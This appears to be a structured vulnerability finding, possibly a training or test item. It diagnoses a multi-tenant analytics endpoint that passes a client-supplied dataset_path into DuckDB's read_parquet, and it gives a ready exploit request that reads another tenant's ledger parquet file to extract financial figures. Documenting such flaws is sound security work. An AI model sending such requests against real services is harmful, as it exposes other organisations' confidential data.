diagnosis: The analytics endpoint uses DuckDB's in-process SQL engine to aggregate parquet files. It accepts dataset_path from the client and passes it directly into read_parquet(?). Because the DuckDB process runs with access to the entire data lake containing all tenants' parquet exports, an attacker can supply paths to other organizations' parquet files and extract aggregate financial and metric figures.
exploit_request:
POST /analytics/lakehouse/aggregate HTTP/1.1
Host: analytics-api.datalake.io
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"dataset_path": "s3://prod-lakehouse-data/tenants/tenant_uber_corp/ledger_2026.parquet", "metric_column": "transaction_amount"}
